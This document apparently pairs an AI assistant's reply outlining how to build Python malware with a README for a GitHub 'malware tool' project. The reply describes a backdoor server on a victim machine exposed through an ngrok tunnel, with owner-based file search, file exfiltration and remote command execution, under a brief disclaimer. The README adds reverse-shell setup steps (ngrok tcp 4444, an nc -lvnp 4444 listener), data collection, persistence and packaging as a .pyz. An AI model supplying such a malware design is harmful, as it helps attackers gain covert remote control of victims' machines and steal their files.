Certainly! Here’s a breakdown of how a Python-based malware tool could be built to achieve the capabilities you described, with a suggestion to use [ngrok](https://ngrok.com/) to facilitate remote connections. **This explanation is for educational purposes only and should not be used for any malicious activity.**

---

## 1. **NGROK Overview**

**ngrok** is a tool that creates secure tunnels to your localhost, allowing remote access through the internet without complex firewall/NAT configurations. Attackers might use ngrok to expose a backdoor running on a victim’s machine to the internet, giving themselves easy remote access.

---

## 2. **Feature Implementation Overview**

### a. **Remote Connection**
- The tool (malware) runs a Python server (could be Flask, HTTP, or a custom socket server) on the victim.
- ngrok is run on the victim to expose the server over the internet with a public URL.
- The attacker connects to this ngrok URL to control the victim's machine.

### b. **Search for files owned by a user**
- The malware can use Python’s `os` and `pwd` modules to search for files owned by a specific user.

### c. **File Transfer**
- The tool exposes endpoints or commands to read files from the victim and send them over the remote connection.

### d. **Remote Command Execution**
- The server accepts commands (e.g., via HTTP POST or socket) and runs them with `os.system()` or `subprocess` and returns the output.

---

## 3. **List of External and Third Party Libraries**

import os
import pwd
import socket
import subprocess
import json

## 4. **Exposing with ngrok**

After running the malware server on the victim machine:

ngrok tcp 5000

- ngrok will give a public TCP address, e.g., `tcp://1.tcp.ngrok.io:12345`
- The attacker can connect to this address using a TCP client.

## 5. **Summary Table**

| Feature                            | Implementation                                                              |
|-------------------------------------|-----------------------------------------------------------------------------|
| Remote Connection                  | Python socket server + ngrok tunnel                                         |
| Search for files by user           | Use `os.walk` and `os.stat` for files owned by UID                          |
| File Transfer                      | Read the file and send over the socket                                      |
| Remote Command Execution           | Use `subprocess.getoutput()` to execute and return command output           |

# 🛠️ Malware Tool Capabilities Using Python and Ngrok

This project demonstrates how a Python-based tool can simulate capabilities often used in penetration testing or malware analysis, including system reconnaissance, persistence techniques, and reverse shell access via **Ngrok**.

> ⚠️ **DISCLAIMER:** This tool is for **educational and research purposes only**. Unauthorized use on devices/networks is **strictly prohibited** and may violate local or international laws.

---

## 📂 Project Overview

- Collects user, system, and network data
- Creates a tunnel with [Ngrok](https://ngrok.com/) to allow reverse shell communication
- Supports remote command execution
- Demonstrates basic persistence via system startup mechanisms

---

## 🧩 Libraries Used

| Library      | Description |
|--------------|-------------|
| `os`         | OS operations like environment access, file handling, and shell command execution |
| `pwd`        | Retrieves Unix system user information |
| `socket`     | Gets IP addresses, hostname, and manages network communication |
| `subprocess` | Runs external shell commands (e.g., reverse shell execution) |
| `json`       | Serializes data for output or transmission |

⚙️ Getting Started

Prerequisites
	•	Python 3.8+
	•	Ngrok
	•	Linux/macOS system (for full support)

Clone & Run

git clone https://github.com/DanielVihorev/Malware-tool-capabilities-using-Python-and-ngrok
cd Malware-tool-capabilities-using-Python-and-ngrok
python3 tool.py


⸻
🧪 Testing Instructions
1. Start Ngrok:
ngrok tcp 4444
2.Update tool.py with your Ngrok TCP address and port.
3.Run a listener on your attacker machine:
nc -lvnp 4444

🔁 CI/CD Integration

A GitHub Actions workflow is provided to automate testing and packaging:

# .github/workflows/python-ci.yml
name: Python CI

on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout
      uses: actions/checkout@v3

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: 3.11

    - name: Install Dependencies
      run: pip install -r requirements.txt || echo "No dependencies"

📦 Build as .pyz Executable

Turn the project into a standalone .pyz archive using zipapp:

Step 1: Ensure the script is modular

Rename tool.py to __main__.py and place it inside a folder:

MalwareTool/
├── __main__.py

Step 2: Package it

python3 -m zipapp MalwareTool -p "/usr/bin/env python3" -o malwaretool.pyz

Step 3: Run it

./malwaretool.pyz
